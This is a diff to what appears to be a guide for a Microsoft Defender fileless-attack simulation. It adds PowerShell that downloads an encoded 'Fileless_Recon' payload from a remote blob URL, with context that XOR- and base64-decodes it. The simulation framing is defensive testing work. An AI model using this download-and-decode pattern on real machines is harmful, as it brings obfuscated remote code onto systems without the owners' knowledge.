@@ -10,6 +10,13 @@ https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_R
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 
+# Define the URL and the destination path
+$url = "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt"
+$destination = "C:\Temp\MTP_Fileless_Recon.txt"
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $destination
+
 $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection')
 
 $base64String = Get-Content -Path "C:\Temp\MTP_Fileless_Recon.txt"
